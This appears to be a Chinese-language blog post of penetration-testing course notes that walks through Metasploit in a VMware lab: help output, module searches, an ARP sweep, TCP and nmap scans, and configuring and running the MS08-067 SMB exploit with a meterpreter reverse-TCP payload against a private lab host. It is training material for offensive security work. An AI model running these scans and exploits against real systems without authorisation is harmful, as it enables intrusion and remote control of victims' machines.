---
layout: post
title: "Metasploit"
date: "2022-07-25"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Network Attacks
---

# Metasploit
更新：`Kali Linux->Exploitation Tools->Metasploit->update metasploit`。或者直接在终端运行；`msfupdate`。

在运行Metasploit之前，启用一些服务：

```
service postgresql start
service metasploit start
msfconsole
```

```
msf6 > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    debug         Display information useful for debugging
    exit          Exit the console
    features      Display the list of not yet released features that can be opted in to
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    load          Load a framework plugin
    quit          Exit the console
    repeat        Repeat a list of commands
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    tips          Show a list of useful productivity tips
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers


Module Commands
===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    clearm        Clear the module stack
    favorite      Add module(s) to the list of favorite modules
    info          Displays information about one or more modules
    listm         List the module stack
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Interact with a module by name or search term/index


Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    analyze           Analyze database information about a specific address or address range
    db_connect        Connect to an existing data service
    db_disconnect     Disconnect from the current data service
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
    db_remove         Remove the saved data service entry
    db_save           Save the current data service connection as the default to reconnect on startup
    db_status         Show the current data service status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database


Developer Commands
==================

    Command       Description
    -------       -----------
    edit          Edit the current module or a file with the preferred editor
    irb           Open an interactive Ruby shell in the current context
    log           Display framework.log paged to the end if possible
    pry           Open the Pry debugger on the current module or Framework
    reload_lib    Reload Ruby library files from specified paths
    time          Time how long it takes to run a particular command


msfconsole
==========

`msfconsole` is the primary interface to Metasploit Framework. There is quite a
lot that needs go here, please be patient and keep an eye on this space!

Building ranges and lists
-------------------------

Many commands and options that take a list of things can use ranges to avoid
having to manually list each desired thing. All ranges are inclusive.

### Ranges of IDs

Commands that take a list of IDs can use ranges to help. Individual IDs must be
separated by a `,` (no space allowed) and ranges can be expressed with either
`-` or `..`.

### Ranges of IPs

There are several ways to specify ranges of IP addresses that can be mixed
together. The first way is a list of IPs separated by just a ` ` (ASCII space),
with an optional `,`. The next way is two complete IP addresses in the form of
`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
specifications may also be used, however the whole address must be given to
Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
Additionally, a netmask can be used in conjunction with a domain name to
dynamically resolve which block to target. All these methods work for both IPv4
and IPv6 addresses. IPv4 addresses can also be specified with special octet
ranges from the [NMAP target
specification](https://nmap.org/book/man-target-specification.html)

### Examples

Terminate the first sessions:

    sessions -k 1

Stop some extra running jobs:

    jobs -k 2-6,7,8,11..15

Check a set of IP addresses:

    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255

Target a set of IPv6 hosts:

    set RHOSTS fe80::3990:0000/110, ::1-::f0f0

Target a block from a resolved domain name:

    set RHOSTS www.example.test/24
```

```
msf6 > search -h
Usage: search [<options>] [<keywords>:<value>]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.


OPTIONS:

    -h, --help                      Help banner
    -I, --ignore                    Ignore the command if the only match has the same name as the search
    -o, --output <filename>         Send output to a file in csv format
    -r, --sort-descending <column>  Reverse the order of search results to descending order
    -S, --filter <filter>           Regex pattern used to filter search results
    -s, --sort-ascending <column>   Sort search results by the specified column in ascending order
    -u, --use                       Use module if there is one result

Keywords:
  aka              :  Modules with a matching AKA (also-known-as) name
  author           :  Modules written by this author
  arch             :  Modules affecting this architecture
  bid              :  Modules with a matching Bugtraq ID
  cve              :  Modules with a matching CVE ID
  edb              :  Modules with a matching Exploit-DB ID
  check            :  Modules that support the 'check' method
  date             :  Modules with a matching disclosure date
  description      :  Modules with a matching description
  fullname         :  Modules with a matching full name
  mod_time         :  Modules with a matching modification date
  name             :  Modules with a matching descriptive name
  path             :  Modules with a matching path
  platform         :  Modules affecting this platform
  port             :  Modules with a matching port
  rank             :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
  ref              :  Modules with a matching ref
  reference        :  Modules with a matching reference
  target           :  Modules affecting this target
  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)

Supported search columns:
  rank             :  Sort modules by their exploitabilty rank
  date             :  Sort modules by their disclosure date. Alias for disclosure_date
  disclosure_date  :  Sort modules by their disclosure date
  name             :  Sort modules by their name
  type             :  Sort modules by their type
  check            :  Sort modules by whether or not they have a check method

Examples:
  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r
```

```
msf6 > search arp

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   auxiliary/spoof/arp/arp_poisoning              1999-12-22       normal     No     ARP Spoof
   1   auxiliary/scanner/discovery/arp_sweep                           normal     No     ARP Sweep Local Network Discovery
   2   post/windows/gather/bloodhound                                  normal     No     BloodHound Ingestor
   3   exploit/unix/webapp/carberp_backdoor_exec      2013-06-28       great      Yes    Carberp Web Panel C2 Backdoor Remote PHP Code Execution
   4   exploit/linux/http/dlink_dcs931l_upload        2015-02-23       great      Yes    D-Link DCS-931L File Upload
   5   auxiliary/scanner/discovery/ipv6_neighbor                       normal     No     IPv6 Local Neighbor Discovery
   6   exploit/windows/browser/ms05_054_onload        2005-11-21       normal     No     MS05-054 Microsoft Internet Explorer JavaScript OnLoad Handler Remote Code Execution
   7   exploit/windows/smb/smb_shadow                 2021-02-16       manual     No     Microsoft Windows SMB Direct Session Takeover
   8   exploit/unix/ftp/proftpd_133c_backdoor         2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
   9   auxiliary/scanner/misc/raysharp_dvr_passwords                   normal     No     Ray Sharp DVR Password Retriever
   10  post/windows/gather/arp_scanner                                 normal     No     Windows Gather ARP Scanner
   11  post/windows/gather/forensics/browser_history                   normal     No     Windows Gather Skype, Firefox, and Chrome Artifacts


Interact with a module by name or index. For example info 11, use 11 or use post/windows/gather/forensics/browser_history
```

```
msf6 > use auxiliary/scanner/discovery/arp_sweep
msf6 auxiliary(scanner/discovery/arp_sweep) > show options

Module options (auxiliary/scanner/discovery/arp_sweep):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   INTERFACE                   no        The name of the interface
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   SHOST                       no        Source IP Address
   SMAC                        no        Source MAC Address
   THREADS    1                yes       The number of concurrent threads (max one per host)
   TIMEOUT    5                yes       The number of seconds to wait for new data

msf6 auxiliary(scanner/discovery/arp_sweep) > set RHOSTS 192.168.248.0/24
RHOSTS => 192.168.248.0/24
msf6 auxiliary(scanner/discovery/arp_sweep) > show options

Module options (auxiliary/scanner/discovery/arp_sweep):

   Name       Current Setting   Required  Description
   ----       ---------------   --------  -----------
   INTERFACE                    no        The name of the interface
   RHOSTS     192.168.248.0/24  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   SHOST                        no        Source IP Address
   SMAC                         no        Source MAC Address
   THREADS    1                 yes       The number of concurrent threads (max one per host)
   TIMEOUT    5                 yes       The number of seconds to wait for new data

msf6 auxiliary(scanner/discovery/arp_sweep) > run

[+] 192.168.248.1 appears to be up (VMware, Inc.).
[+] 192.168.248.2 appears to be up (VMware, Inc.).
[+] 192.168.248.254 appears to be up (VMware, Inc.).
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/discovery/arp_sweep) > ifconfig
[*] exec: ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.248.148  netmask 255.255.255.0  broadcast 192.168.248.255
        inet6 fe80::20c:29ff:feaf:2b2a  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:af:2b:2a  txqueuelen 1000  (Ethernet)
        RX packets 39  bytes 13205 (12.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 302  bytes 20654 (20.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

```
msf6 auxiliary(scanner/discovery/arp_sweep) > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access

msf6 auxiliary(scanner/discovery/arp_sweep) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.248.1
RHOSTS => 192.168.248.1
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-500
PORTS => 1-500
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-500            yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       192.168.248.1    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) > run

[+] 192.168.248.1:        - 192.168.248.1:135 - TCP OPEN
[+] 192.168.248.1:        - 192.168.248.1:139 - TCP OPEN
[+] 192.168.248.1:        - 192.168.248.1:445 - TCP OPEN
[*] 192.168.248.1:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf6 auxiliary(scanner/portscan/tcp) > nmap -A 192.168.248.1
[*] exec: nmap -A 192.168.248.1

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-25 04:42 EDT
Nmap scan report for 192.168.248.1
Host is up (0.0011s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
6646/tcp open  tcpwrapped
MAC Address: 00:50:56:C0:00:08 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7|2008 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (87%), Microsoft Windows 7 (85%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-07-25T08:42:53
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: LAPTOP-xxxxxxxx, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:c0:00:08 (VMware)

TRACEROUTE
HOP RTT     ADDRESS
1   1.08 ms 192.168.248.1

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.61 seconds
```

视频中的脚本已经不可用了：`nmap --script smb-check-vulns.nse --script-args=unsafe=1 192.168.248.1`

```
msf6 auxiliary(scanner/portscan/tcp) > nmap --script smb-vuln-ms08-067.nse -p 445 192.168.248.1
[*] exec: nmap --script smb-vuln-ms08-067.nse -p 445 192.168.248.1

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-25 04:53 EDT
Nmap scan report for 192.168.248.1
Host is up (0.00015s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```

![smb-check-vulns.png](/img/in-post/ine/smb-check-vulns.png)

```
msf6 auxiliary(scanner/portscan/tcp) > search MS08-067

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi

msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.248.148  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 192.168.248.1
RHOSTS => 192.168.248.1
```

```
msf6 exploit(windows/smb/ms08_067_netapi) > show payloads

Compatible Payloads
===================

   #    Name                                                        Disclosure Date  Rank    Check  Description
   -    ----                                                        ---------------  ----    -----  -----------
   0    payload/generic/custom                                                       normal  No     Custom Payload
   1    payload/generic/debug_trap                                                   normal  No     Generic x86 Debug Trap
   2    payload/generic/shell_bind_tcp                                               normal  No     Generic Command Shell, Bind TCP Inline
   3    payload/generic/shell_reverse_tcp                                            normal  No     Generic Command Shell, Reverse TCP Inline
   4    payload/generic/ssh/interact                                                 normal  No     Interact with Established SSH Connection
   5    payload/generic/tight_loop                                                   normal  No     Generic x86 Tight Loop
   6    payload/windows/adduser                                                      normal  No     Windows Execute net user /ADD
   7    payload/windows/dllinject/bind_hidden_ipknock_tcp                            normal  No     Reflective DLL Injection, Hidden Bind Ipknock TCP Stager
   8    payload/windows/dllinject/bind_hidden_tcp                                    normal  No     Reflective DLL Injection, Hidden Bind TCP Stager
   9    payload/windows/dllinject/bind_ipv6_tcp                                      normal  No     Reflective DLL Injection, Bind IPv6 TCP Stager (Windows x86)
   10   payload/windows/dllinject/bind_ipv6_tcp_uuid                                 normal  No     Reflective DLL Injection, Bind IPv6 TCP Stager with UUID Support (Windows x86)
   11   payload/windows/dllinject/bind_named_pipe                                    normal  No     Reflective DLL Injection, Windows x86 Bind Named Pipe Stager
   12   payload/windows/dllinject/bind_nonx_tcp                                      normal  No     Reflective DLL Injection, Bind TCP Stager (No NX or Win7)
   13   payload/windows/dllinject/bind_tcp                                           normal  No     Reflective DLL Injection, Bind TCP Stager (Windows x86)
   14   payload/windows/dllinject/bind_tcp_uuid                                      normal  No     Reflective DLL Injection, Bind TCP Stager with UUID Support (Windows x86)
   15   payload/windows/dllinject/reverse_hop_http                                   normal  No     Reflective DLL Injection, Reverse Hop HTTP/HTTPS Stager
   16   payload/windows/dllinject/reverse_ipv6_tcp                                   normal  No     Reflective DLL Injection, Reverse TCP Stager (IPv6)
   17   payload/windows/dllinject/reverse_nonx_tcp                                   normal  No     Reflective DLL Injection, Reverse TCP Stager (No NX or Win7)
   18   payload/windows/dllinject/reverse_ord_tcp                                    normal  No     Reflective DLL Injection, Reverse Ordinal TCP Stager (No NX or Win7)
   19   payload/windows/dllinject/reverse_tcp                                        normal  No     Reflective DLL Injection, Reverse TCP Stager
   20   payload/windows/dllinject/reverse_tcp_allports                               normal  No     Reflective DLL Injection, Reverse All-Port TCP Stager
   21   payload/windows/dllinject/reverse_tcp_dns                                    normal  No     Reflective DLL Injection, Reverse TCP Stager (DNS)
   22   payload/windows/dllinject/reverse_tcp_uuid                                   normal  No     Reflective DLL Injection, Reverse TCP Stager with UUID Support
   23   payload/windows/dns_txt_query_exec                                           normal  No     DNS TXT Record Payload Download and Execution
   24   payload/windows/exec                                                         normal  No     Windows Execute Command
   25   payload/windows/format_all_drives                                            manual  No     Windows Drive Formatter
   26   payload/windows/loadlibrary                                                  normal  No     Windows LoadLibrary Path
   27   payload/windows/messagebox                                                   normal  No     Windows MessageBox
   28   payload/windows/meterpreter/bind_hidden_ipknock_tcp                          normal  No     Windows Meterpreter (Reflective Injection), Hidden Bind Ipknock TCP Stager
   29   payload/windows/meterpreter/bind_hidden_tcp                                  normal  No     Windows Meterpreter (Reflective Injection), Hidden Bind TCP Stager
   30   payload/windows/meterpreter/bind_ipv6_tcp                                    normal  No     Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
   31   payload/windows/meterpreter/bind_ipv6_tcp_uuid                               normal  No     Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
   32   payload/windows/meterpreter/bind_named_pipe                                  normal  No     Windows Meterpreter (Reflective Injection), Windows x86 Bind Named Pipe Stager
   33   payload/windows/meterpreter/bind_nonx_tcp                                    normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (No NX or Win7)
   34   payload/windows/meterpreter/bind_tcp                                         normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (Windows x86)
   35   payload/windows/meterpreter/bind_tcp_uuid                                    normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
   36   payload/windows/meterpreter/reverse_hop_http                                 normal  No     Windows Meterpreter (Reflective Injection), Reverse Hop HTTP/HTTPS Stager
   37   payload/windows/meterpreter/reverse_https_proxy                              normal  No     Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager with Support for Custom Proxy
   38   payload/windows/meterpreter/reverse_ipv6_tcp                                 normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (IPv6)
   39   payload/windows/meterpreter/reverse_named_pipe                               normal  No     Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe (SMB) Stager
   40   payload/windows/meterpreter/reverse_nonx_tcp                                 normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (No NX or Win7)
   41   payload/windows/meterpreter/reverse_ord_tcp                                  normal  No     Windows Meterpreter (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
   42   payload/windows/meterpreter/reverse_tcp                                      normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager
   43   payload/windows/meterpreter/reverse_tcp_allports                             normal  No     Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager
   44   payload/windows/meterpreter/reverse_tcp_dns                                  normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
   45   payload/windows/meterpreter/reverse_tcp_uuid                                 normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager with UUID Support
```

```
msf6 exploit(windows/smb/ms08_067_netapi) > set PAYLOAD payload/windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.168.248.1    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.248.148  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.248.148
LHOST => 192.168.248.148
msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.168.248.1    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.248.148  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting


msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 192.168.248.148:4444 
[-] 192.168.248.1:445 - Connection reset during login
[-] 192.168.248.1:445 - This most likely means a previous exploit attempt caused the service to crash
[*] Exploit completed, but no session was created.
```

![exploit-ms08-067.png](/img/in-post/ine/exploit-ms08-067.png)

![get-a-meterpreter.png](/img/in-post/ine/get-a-meterpreter.png)





